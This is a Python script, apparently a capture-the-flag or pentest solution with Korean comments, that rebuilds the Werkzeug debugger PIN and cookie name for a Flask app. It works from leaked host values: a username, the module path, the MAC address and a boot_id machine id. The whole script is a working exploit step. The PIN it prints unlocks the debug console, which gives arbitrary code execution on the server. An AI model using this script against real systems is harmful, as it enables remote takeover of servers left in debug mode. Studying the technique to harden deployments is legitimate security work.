import hashlib
from itertools import chain
probably_public_bits = [
    'root', # username
    'flask.app',# modname 고정
    'Flask',    # getattr(app, '__name__', getattr(app.__class__, '__name__')) 고정
    '/usr/local/lib/python3.12/site-packages/flask/app.py' # getattr(mod, '__file__', None),
                                                          # python 버전 마다 위치 다름
]
 
private_bits = [
    '19938859674282',  # MAC주소를 int형으로 변환한 값,  02:42:ac:11:00:02 aa:fc:00:00:6f:01
     # get_machine_id() /proc/sys/kernel/random/boot_id
    '022b007a-369c-4f8a-9e78-c31ac8301057']
 
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')
 
cookie_name = f'__wzd{h.hexdigest()[:20]}'
 
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
 
rv =None
if rv is None:
    for group_size in 5, 4, 3:  # 5자리, 4자리, 3자리 그룹으로 시도
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num
print(rv)
print(cookie_name)
